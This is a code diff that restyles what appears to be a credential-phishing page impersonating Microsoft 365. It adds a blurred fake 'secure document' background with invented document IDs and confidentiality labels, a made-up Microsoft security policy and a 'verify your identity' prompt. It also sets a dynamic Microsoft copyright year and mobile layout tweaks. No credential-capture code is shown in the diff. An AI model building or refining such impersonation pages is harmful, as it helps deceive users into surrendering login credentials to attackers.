@@ -11,43 +11,42 @@
       --ms-font: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
     }
 
-    /* Blurry real document background */
-body::before {
-  content: "";
-  position: fixed;
-  top: 0;
-  left: 0;
-  width: 100%;
-  height: 100%;
-  background-image: url('https://via.placeholder.com/1200x1600.png?text=Document+Preview');
-  background-size: cover;
-  background-position: center;
-  filter: blur(5px) brightness(5.95);
-  opacity: 0.7;
-  z-index: -1;
-}
+    /* Enhanced blurry document background */
+    body::before {
+      content: "";
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%"><rect width="100%" height="100%" fill="%23f8f8f8"/><rect x="5%" y="10%" width="90%" height="80%" rx="5" fill="white" stroke="%23ddd" stroke-width="1"/><line x1="10%" y1="20%" x2="90%" y2="20%" stroke="%23eee" stroke-width="1"/><line x1="10%" y1="25%" x2="90%" y2="25%" stroke="%23eee" stroke-width="1"/><line x1="10%" y1="30%" x2="90%" y2="30%" stroke="%23eee" stroke-width="1"/><text x="12%" y="18%" font-family="Arial" font-size="14" font-weight="bold" fill="%230078d4">MICROSOFT 365 ENTERPRISE - SECURE DOCUMENT</text><text x="12%" y="23%" font-family="Arial" font-size="12" fill="%23555">Document ID: MS-ENT-5XHD-8832-9921</text><text x="12%" y="28%" font-family="Arial" font-size="12" fill="%23555">Security Level: PROTECTED B - CONFIDENTIAL</text><line x1="10%" y1="40%" x2="90%" y2="40%" stroke="%23eee" stroke-width="1"/><text x="12%" y="45%" font-family="Arial" font-size="12" fill="%23333">This document contains proprietary information protected under</text><text x="12%" y="50%" font-family="Arial" font-size="12" fill="%23333">Microsoft 365 Enterprise security policies. Unauthorized access is prohibited.</text><text x="12%" y="60%" font-family="Arial" font-size="12" fill="%230078d4">Please verify your identity to access this document</text><text x="12%" y="65%" font-family="Arial" font-size="10" fill="%23999">Verification required per Microsoft Security Policy MS-365-ENT-2023</text></svg>');
+      background-size: cover;
+      background-position: center;
+      filter: blur(4px);
+      opacity: 0.9;
+      z-index: -1;
+    }
 
     body {
       margin: 0;
-      background-color: var(--ms-light);
       font-family: var(--ms-font);
       display: flex;
       justify-content: center;
       align-items: center;
-      height: 100vh;
+      min-height: 100vh;
       position: relative;
+      background-color: #f0f0f0;
     }
 
     .container {
-      background: rgba(255, 255, 255, 0.92);
+      background: rgba(255, 255, 255, 0.95);
       padding: 40px 30px;
       border-radius: 8px;
-      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.12);
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.15);
       width: 90%;
       max-width: 440px;
       text-align: center;
-      backdrop-filter: blur(1px);
-      border: 1px solid rgba(255,255,255,0.3);
+      border: 1px solid rgba(0, 0, 0, 0.05);
     }
 
     .logo img {
@@ -87,6 +86,8 @@ body::before {
       border-radius: 6px;
       cursor: pointer;
       transition: background-color 0.2s;
+      width: 100%;
+      max-width: 200px;
     }
 
     .btn:hover {
@@ -103,6 +104,15 @@ body::before {
       margin-top: 30px;
       font-size: 12px;
       color: #888;
+    }
+
+    @media (max-width: 480px) {
+      body::before {
+        background-size: auto 100%;
+      }
+      .container {
+        padding: 30px 20px;
+      }
     }
   </style>
 
@@ -137,7 +147,7 @@ body::before {
     <div class="error" id="errorMessage"></div>
 
     <div class="footer">
-      &copy; 2025 Microsoft Corporation. All rights reserved.
+      &copy; <script>document.write(new Date().getFullYear())</script> Microsoft Corporation. All rights reserved.
     </div>
   </div>
 </body>
